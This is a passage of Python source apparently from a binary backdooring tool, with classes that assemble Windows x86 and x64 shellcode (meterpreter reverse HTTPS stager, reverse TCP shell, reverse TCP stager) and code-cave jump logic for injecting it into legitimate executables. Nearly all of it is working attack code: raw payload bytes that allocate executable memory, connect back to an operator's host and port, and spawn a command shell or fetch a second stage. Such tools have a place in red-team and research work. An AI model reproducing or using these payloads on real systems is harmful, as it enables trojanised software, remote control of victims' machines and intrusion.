                           "\x0C\x4B\x8B\x58\x1C\x01\xD3\x90\xEB\x04\xCD\x97\xF1\xB1\x8B\x04"
                           "\x8B\x01\xD0\x90\x89\x44\x24\x24\x5B\x5B\x61\x90\x59\x5A\x51\xEB"
                           "\x01\x0F\xFF\xE0\x58\x90\x5F\x5A\x8B\x12\xE9\x53\xFF\xFF\xFF\x90"
                           "\x5D\x90"
                           "\xBE")
        self.shellcode1 += struct.pack("<H", len(self.supplied_shellcode) + 5)

        self.shellcode1 += ("\x00\x00"
                            "\x90\x6A\x40\x90\x68\x00\x10\x00\x00"
                            "\x56\x90\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x89\xC3\x89\xC7\x90"
                            "\x89\xF1"
                            )

        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                             breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\xeb\x44"  # <--length of shellcode below

        self.shellcode1 += "\x90\x5e"
        self.shellcode1 += ("\x90\x90\x90"
                            "\xF2\xA4"
                            "\xE8\x20\x00\x00"
                            "\x00\xBB\xE0\x1D\x2A\x0A\x90\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06"
                            "\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF"
                            "\xD5\x31\xC0\x50\x50\x50\x53\x50\x50\x68\x38\x68\x0D\x16\xFF\xD5"
                            "\x58\x58\x90\x61"
                            )

        breakupvar = eat_code_caves(flItms, 0, 2)
        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                             breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3).rstrip("L")), 16))
        #else:
        #    self.shellcode1 += "\xEB\x06\x01\x00\x00"

        #Begin shellcode 2:

        breakupvar = eat_code_caves(flItms, 0, 1)

        if flItms['cave_jumping'] is True:
            self.shellcode2 = "\xe8"
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                             len(self.shellcode2) + 241).rstrip("L")), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                             breakupvar + 241).rstrip("L")), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                   len(self.shellcode2) + 234).rstrip("L")), 16))
        else:
            self.shellcode2 = "\xE8\xB7\xFF\xFF\xFF"

        #Can inject any shellcode below.

        self.shellcode2 += self.supplied_shellcode
        self.shellcode1 += "\xe9"
        self.shellcode1 += struct.pack("<I", len(self.shellcode2))
        
        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return (self.stackpreserve + self.shellcode1, self.shellcode2)

    def meterpreter_reverse_https(self, flItms, CavesPicked={}):
        """
        Traditional meterpreter reverse https shellcode from metasploit
        modified to support cave jumping.
        """
        if self.PORT is None:
            print ("Must provide port")
            sys.exit(1)

        flItms['stager'] = True

        breakupvar = eat_code_caves(flItms, 0, 1)

        #shellcode1 is the thread
        self.shellcode1 = ("\xFC\x90\xE8\xC1\x00\x00\x00\x60\x89\xE5\x31\xD2\x90\x64\x8B"
                           "\x52\x30\x8B\x52\x0C\x8B\x52\x14\xEB\x02"
                           "\x41\x10\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0\xAC\x3C\x61"
                           "\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\x49\x75\xEF\x52\x90\x57\x8B"
                           "\x52\x10\x90\x8B\x42\x3C\x01\xD0\x90\x8B\x40\x78\xEB\x07\xEA\x48"
                           "\x42\x04\x85\x7C\x3A\x85\xC0\x0F\x84\x68\x00\x00\x00\x90\x01\xD0"
                           "\x50\x90\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x58\x49\x8B\x34\x8B"
                           "\x01\xD6\x31\xFF\x90\x31\xC0\xEB\x04\xFF\x69\xD5\x38\xAC\xC1\xCF"
                           "\x0D\x01\xC7\x38\xE0\xEB\x05\x7F\x1B\xD2\xEB\xCA\x75\xE6\x03\x7D"
                           "\xF8\x3B\x7D\x24\x75\xD4\x58\x90\x8B\x58\x24\x01\xD3\x90\x66\x8B"
                           "\x0C\x4B\x8B\x58\x1C\x01\xD3\x90\xEB\x04\xCD\x97\xF1\xB1\x8B\x04"
                           "\x8B\x01\xD0\x90\x89\x44\x24\x24\x5B\x5B\x61\x90\x59\x5A\x51\xEB"
                           "\x01\x0F\xFF\xE0\x58\x90\x5F\x5A\x8B\x12\xE9\x53\xFF\xFF\xFF\x90"
                           "\x5D\x90"
                           )

        self.shellcode1 += "\xBE"
        self.shellcode1 += struct.pack("<H", 361 + len(self.HOST))
        self.shellcode1 += "\x00\x00"  # <---Size of shellcode2 in hex
        self.shellcode1 +=  ("\x90\x6A\x40\x90\x68\x00\x10\x00\x00"
                           "\x56\x90\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x89\xC3\x89\xC7\x90"
                           "\x89\xF1"
                           )

        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                             breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\xeb\x44"   # <--length of shellcode below
        self.shellcode1 += "\x90\x5e"
        self.shellcode1 += ("\x90\x90\x90"
                            "\xF2\xA4"
                            "\xE8\x20\x00\x00"
                            "\x00\xBB\xE0\x1D\x2A\x0A\x90\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06"
                            "\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF"
                            "\xD5\x31\xC0\x50\x50\x50\x53\x50\x50\x68\x38\x68\x0D\x16\xFF\xD5"
                            "\x58\x58\x90\x61"
                            )

        breakupvar = eat_code_caves(flItms, 0, 2)

        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 3).rstrip("L")), 16))
        else:
            self.shellcode1 += "\xE9"
            self.shellcode1 += struct.pack("<H", 361 + len(self.HOST))
            self.shellcode1 += "\x00\x00"  # <---length shellcode2 + 5

        #Begin shellcode 2:
        breakupvar = eat_code_caves(flItms, 0, 1)

        if flItms['cave_jumping'] is True:
            self.shellcode2 = "\xe8"
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                             len(self.shellcode2) + 241).rstrip("L")), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                             breakupvar + 241).rstrip("L")), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                             len(self.shellcode2) + 234).rstrip("L")), 16))
        else:
            self.shellcode2 = "\xE8\xB7\xFF\xFF\xFF"

        self.shellcode2 += ("\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
                            "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
                            "\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
                            "\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
                            "\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
                            "\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
                            "\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
                            "\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
                            "\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
                            "\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68"
                            "\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57"
                            "\x57\x57\x57\x6a\x00\x54\x68\x3a\x56\x79\xa7\xff\xd5\xeb\x5f"
                            "\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68")
        self.shellcode2 += struct.pack("<h", self.PORT)
        self.shellcode2 += ("\x00\x00\x53"
                            "\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x48\x59\x31\xd2\x52\x68"
                            "\x00\x32\xa0\x84\x52\x52\x52\x51\x52\x50\x68\xeb\x55\x2e\x3b"
                            "\xff\xd5\x89\xc6\x6a\x10\x5b\x68\x80\x33\x00\x00\x89\xe0\x6a"
                            "\x04\x50\x6a\x1f\x56\x68\x75\x46\x9e\x86\xff\xd5\x31\xff\x57"
                            "\x57\x57\x57\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x75\x1a"
                            "\x4b\x74\x10\xeb\xd5\xeb\x49\xe8\xb3\xff\xff\xff\x2f\x48\x45"
                            "\x56\x79\x00\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00"
                            "\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff"
                            "\xd5\x93\x53\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68"
                            "\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xcd\x8b\x07\x01\xc3\x85"
                            "\xc0\x75\xe5\x58\xc3\xe8\x51\xff\xff\xff")
        self.shellcode2 += self.HOST
        self.shellcode2 += "\x00"

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return (self.stackpreserve + self.shellcode1, self.shellcode2)

    def reverse_shell_tcp(self, flItms, CavesPicked={}):
        """
        Modified metasploit windows/shell_reverse_tcp shellcode
        to enable continued execution and cave jumping.
        """
        if self.PORT is None:
            print ("Must provide port")
            sys.exit(1)
        #breakupvar is the distance between codecaves
        breakupvar = eat_code_caves(flItms, 0, 1)
        self.shellcode1 = "\xfc\xe8"

        if flItms['cave_jumping'] is True:
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                                 len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                             breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\x89\x00\x00\x00"

        self.shellcode1 += ("\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
                            "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
                            "\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
                            "\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
                            "\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
                            "\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
                            "\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
                            "\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
                            "\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
                            "\xe0\x58\x5f\x5a\x8b\x12\xeb\x86"
                            )

        self.shellcode2 = ("\x5d\x68\x33\x32\x00\x00\x68"
                           "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01"
                           "\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50"
                           "\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x89\xc7"
                           "\x68"
                           )
        self.shellcode2 += self.pack_ip_addresses()  # IP
        self.shellcode2 += ("\x68\x02\x00")
        self.shellcode2 += struct.pack('!h', self.PORT)  # PORT
        self.shellcode2 += ("\x89\xe6\x6a\x10\x56"
                            "\x57\x68\x99\xa5\x74\x61\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3"
                            "\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24"
                            "\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56"
                            "\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89"
                            #The NOP in the line below allows for continued execution.
                            "\xe0\x4e\x90\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0"
                            "\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80"
                            "\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
                            "\x81\xc4\xfc\x01\x00\x00"
                            )

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2 + self.stackrestore
        return (self.stackpreserve + self.shellcode1, self.shellcode2 + self.stackrestore)



########NEW FILE########
__FILENAME__ = WinIntelPE64
'''
    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
    
    Copyright (C) 2013,2014, Joshua Pitts

    License:   GPLv3

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    See <http://www.gnu.org/licenses/> for a copy of the GNU General
    Public License

    Currently supports win32/64 PE and linux32/64 ELF only(intel architecture).
    This program is to be used for only legal activities by IT security
    professionals and researchers. Author not responsible for malicious
    uses.
'''


##########################################################
#               BEGIN win64 shellcodes                   #
##########################################################
import struct
import sys
from intelmodules import eat_code_caves

class winI64_shellcode():
    """
    Windows Intel x64 shellcode class
    """
    
    def __init__(self, HOST, PORT, SUPPLIED_SHELLCODE):
        self.HOST = HOST
        self.PORT = PORT
        self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
        self.shellcode = ""
        self.stackpreserve = ("\x90\x90\x50\x53\x51\x52\x56\x57\x54\x55\x41\x50"
                              "\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              )

        self.stackrestore = ("\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                             "\x41\x58\x5d\x5c\x5f\x5e\x5a\x59\x5b\x58"
                             )

    def pack_ip_addresses(self):
        hostocts = []
        if self.HOST is None:
            print "This shellcode requires a HOST parameter -H"
            sys.exit(1)
        for i, octet in enumerate(self.HOST.split('.')):
                hostocts.append(int(octet))
        self.hostip = struct.pack('=BBBB', hostocts[0], hostocts[1],
                                  hostocts[2], hostocts[3])
        return self.hostip

    def returnshellcode(self):
        return self.shellcode

    def reverse_shell_tcp(self, flItms, CavesPicked={}):
        """
        Modified metasploit windows/x64/shell_reverse_tcp
        """
        if self.PORT is None:
            print ("Must provide port")
            sys.exit(1)

        breakupvar = eat_code_caves(flItms, 0, 1)

        self.shellcode1 = ("\xfc"
                           "\x48\x83\xe4\xf0"
                           "\xe8")

        if flItms['cave_jumping'] is True:
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar -
                                                   len(self.stackpreserve) - len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\xc0\x00\x00\x00"

        self.shellcode1 += ("\x41\x51\x41\x50\x52"
                            "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
                            "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
                            "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
                            "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
                            "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
                            "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
                            "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
                            "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
                            "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
                            "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
                            "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
                            "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
                            "\x8b\x12\xe9\x57\xff\xff\xff")

        self.shellcode2 = ("\x5d\x49\xbe\x77\x73\x32\x5f\x33"
                           "\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
                           "\x49\x89\xe5\x49\xbc\x02\x00")
        self.shellcode2 += struct.pack('!h', self.PORT)
        self.shellcode2 += self.pack_ip_addresses()
        self.shellcode2 += ("\x41\x54"
                            "\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c"
                            "\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff"
                            "\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2"
                            "\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
                            "\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99"
                            "\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x49\xb8\x63"
                            "\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57"
                            "\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44"
                            "\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6"
                            "\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff"
                            "\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5"
                            "\x48\x31\xd2\x90\x90\x90\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
                            "\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
                            "\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
                            "\x72\x6f\x6a\x00\x59\x41\x89\xda"
                            "\x48\x81\xc4\xf8\x00\x00\x00"  # Add RSP X ; align stack
                            )

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2 + self.stackrestore
        return (self.stackpreserve + self.shellcode1, self.shellcode2 + self.stackrestore)

    def reverse_tcp_stager(self, flItms, CavesPicked={}):
        """
        Ported the x32 payload from msfvenom for patching win32 binaries (shellcode1) 
        with the help of Steven Fewer's work on msf win64 payloads. 
        """
        if self.PORT is None:
            print ("Must provide port")
            sys.exit(1)

        flItms['stager'] = True

        #overloading the class stackpreserve
        self.stackpreserve = ("\x90\x50\x53\x51\x52\x56\x57\x55\x41\x50"
                              "\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              )

        breakupvar = eat_code_caves(flItms, 0, 1)
       
        self.shellcode1 = ( "\x90"                              #<--THAT'S A NOP. \o/
                            "\xe8\xc0\x00\x00\x00"              #jmp to allocate
                            #api_call
                            "\x41\x51"                          #push r9
                            "\x41\x50"                          #push r8
                            "\x52"                              #push rdx
                            "\x51"                              #push rcx
                            "\x56"                              #push rsi
                            "\x48\x31\xD2"                      #xor rdx,rdx
                            "\x65\x48\x8B\x52\x60"              #mov rdx,qword ptr gs:[rdx+96]
                            "\x48\x8B\x52\x18"                  #mov rdx,qword ptr [rdx+24]
                            "\x48\x8B\x52\x20"                  #mov rdx,qword ptr[rdx+32]
                            #next_mod
                            "\x48\x8b\x72\x50"                  #mov rsi,[rdx+80]
                            "\x48\x0f\xb7\x4a\x4a"              #movzx rcx,word [rdx+74]      
                            "\x4d\x31\xc9"                      #xor r9,r9
                            #loop_modname
                            "\x48\x31\xc0"                      #xor rax,rax          
                            "\xac"                              #lods
                            "\x3c\x61"                          #cmp al, 61h (a)
                            "\x7c\x02"                          #jl 02
                            "\x2c\x20"                          #sub al, 0x20 
                            #not_lowercase
                            "\x41\xc1\xc9\x0d"                  #ror r9d, 13
                            "\x41\x01\xc1"                      #add r9d, eax
                            "\xe2\xed"                          #loop until read, back to xor rax, rax
                            "\x52"                              #push rdx ; Save the current position in the module list for later
                            "\x41\x51"                          #push r9 ; Save the current module hash for later
                                                                #; Proceed to itterate the export address table,
                            "\x48\x8b\x52\x20"                  #mov rdx, [rdx+32] ; Get this modules base address
                            "\x8b\x42\x3c"                      #mov eax, dword [rdx+60] ; Get PE header
                            "\x48\x01\xd0"                      #add rax, rdx ; Add the modules base address
                            "\x8b\x80\x88\x00\x00\x00"          #mov eax, dword [rax+136] ; Get export tables RVA
                            "\x48\x85\xc0"                      #test rax, rax ; Test if no export address table is present
                            
                            "\x74\x67"                          #je get_next_mod1 ; If no EAT present, process the next module
                            "\x48\x01\xd0"                      #add rax, rdx ; Add the modules base address
                            "\x50"                              #push rax ; Save the current modules EAT
                            "\x8b\x48\x18"                      #mov ecx, dword [rax+24] ; Get the number of function names
                            "\x44\x8b\x40\x20"                  #mov r8d, dword [rax+32] ; Get the rva of the function names
                            "\x49\x01\xd0"                      #add r8, rdx ; Add the modules base address
                                                                #; Computing the module hash + function hash
                            #get_next_func: ;
                            "\xe3\x56"                          #jrcxz get_next_mod ; When we reach the start of the EAT (we search backwards), process the next module
                            "\x48\xff\xc9"                      #  dec rcx ; Decrement the function name counter
                            "\x41\x8b\x34\x88"                  #  mov esi, dword [r8+rcx*4]; Get rva of next module name
                            "\x48\x01\xd6"                      #  add rsi, rdx ; Add the modules base address
                            "\x4d\x31\xc9"                      # xor r9, r9 ; Clear r9 which will store the hash of the function name
                                                                #  ; And compare it to the one we wan                        
                            #loop_funcname: ;
                            "\x48\x31\xc0"                      #xor rax, rax ; Clear rax
                            "\xac"                              #lodsb ; Read in the next byte of the ASCII function name
                            "\x41\xc1\xc9\x0d"                  #ror r9d, 13 ; Rotate right our hash value
                            "\x41\x01\xc1"                      #add r9d, eax ; Add the next byte of the name
                            "\x38\xe0"                          #cmp al, ah ; Compare AL (the next byte from the name) to AH (null)
                            "\x75\xf1"                          #jne loop_funcname ; If we have not reached the null terminator, continue
                            "\x4c\x03\x4c\x24\x08"              #add r9, [rsp+8] ; Add the current module hash to the function hash
                            "\x45\x39\xd1"                      #cmp r9d, r10d ; Compare the hash to the one we are searchnig for
                            "\x75\xd8"                          #jnz get_next_func ; Go compute the next function hash if we have not found it
                                                                #; If found, fix up stack, call the function and then value else compute the next one...
                            "\x58"                              #pop rax ; Restore the current modules EAT
                            "\x44\x8b\x40\x24"                  #mov r8d, dword [rax+36] ; Get the ordinal table rva
                            "\x49\x01\xd0"                      #add r8, rdx ; Add the modules base address
                            "\x66\x41\x8b\x0c\x48"              #mov cx, [r8+2*rcx] ; Get the desired functions ordinal
                            "\x44\x8b\x40\x1c"                  #mov r8d, dword [rax+28] ; Get the function addresses table rva
                            "\x49\x01\xd0"                      #add r8, rdx ; Add the modules base address
                            "\x41\x8b\x04\x88"                  #mov eax, dword [r8+4*rcx]; Get the desired functions RVA
                            "\x48\x01\xd0"                      #add rax, rdx ; Add the modules base address to get the functions actual VA
                                                                #; We now fix up the stack and perform the call to the drsired function...
                            #finish:
                            "\x41\x58"                          #pop r8 ; Clear off the current modules hash
                            "\x41\x58"                          #pop r8 ; Clear off the current position in the module list
                            "\x5E"                              #pop rsi ; Restore RSI
                            "\x59"                              #pop rcx ; Restore the 1st parameter
                            "\x5A"                              #pop rdx ; Restore the 2nd parameter
                            "\x41\x58"                          #pop r8 ; Restore the 3rd parameter
                            "\x41\x59"                          #pop r9 ; Restore the 4th parameter
                            "\x41\x5A"                          #pop r10 ; pop off the return address
                            "\x48\x83\xEC\x20"                  #sub rsp, 32 ; reserve space for the four register params (4 * sizeof(QWORD) = 32)
                                                                # ; It is the callers responsibility to restore RSP if need be (or alloc more space or align RSP).
                            "\x41\x52"                          #push r10 ; push back the return address
                            "\xFF\xE0"                          #jmp rax ; Jump into the required function
                                                                #; We now automagically return to the correct caller...
                            #get_next_mod: ;
                            "\x58"                              #pop rax ; Pop off the current (now the previous) modules EAT
                            #get_next_mod1: ;
                            "\x41\x59"                          #pop r9 ; Pop off the current (now the previous) modules hash
                            "\x5A"                              #pop rdx ; Restore our position in the module list
                            "\x48\x8B\x12"                      #mov rdx, [rdx] ; Get the next module
                            "\xe9\x57\xff\xff\xff"              #jmp next_mod ; Process this module
                            )

        self.shellcode1 += (#allocate
                            "\x5d"                              #pop rbp
                            "\x49\xc7\xc6\xab\x01\x00\x00"      #mov r14, 1abh size of payload
                            "\x6a\x40"                          #push 40h
                            "\x41\x59"                          #pop r9 now 40h
                            "\x68\x00\x10\x00\x00"              #push 1000h
                            "\x41\x58"                          #pop r8.. now 1000h
                            "\x4C\x89\xF2"                      #mov rdx, r14
                            "\x6A\x00"                          # push 0
                            "\x59"                              # pop rcx
                            "\x68\x58\xa4\x53\xe5"              #push E553a458
                            "\x41\x5A"                          #pop r10
                            "\xff\xd5"                          #call rbp
                            "\x48\x89\xc3"                      #mov rbx, rax      ; Store allocated address in ebx
                            "\x48\x89\xc7"                      #mov rdi, rax      ; Prepare EDI with the new address
                            "\x48\xC7\xC1\xAB\x01\x00\x00"      #mov rcx, 0x1ab
                            )
        
        #call the get_payload right before the payload
        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\xeb\x43" 

                            # got_payload:
        self.shellcode1 += ( "\x5e"                                 #pop rsi            ; Prepare ESI with the source to copy               
                            "\xf2\xa4"                              #rep movsb          ; Copy the payload to RWX memory
                            "\xe8\x00\x00\x00\x00"                  #call set_handler   ; Configure error handling

                            #Not Used... :/  Can probably live without.. 
                            #exitfunk:
